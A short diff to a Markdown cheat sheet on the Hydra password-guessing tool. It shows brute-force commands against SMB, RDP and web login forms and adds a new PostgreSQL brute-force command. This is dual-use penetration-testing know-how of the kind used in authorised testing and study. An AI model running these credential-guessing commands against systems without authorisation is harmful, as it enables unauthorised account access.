@@ -102,6 +102,8 @@ hydra -L users.txt -P pass.txt smb://192.168.1.10
 hydra -L users.txt -P pass.txt rdp://192.168.1.10
 ```
 
+
+
 ---
 
 ### 🧠 **Tips & Best Practices**
@@ -226,3 +228,8 @@ in lines like this -> "/login.php:user=^USER^&pass=^PASS^:Invalid credentials"
 
 user and pass must match html file or they will never work 
 most html files use username and password instead of user and pass 
+
+
+
+# POSTGRESQL
+hydra -L <userlist> -P <passlist> -s <port> -f <target> postgres
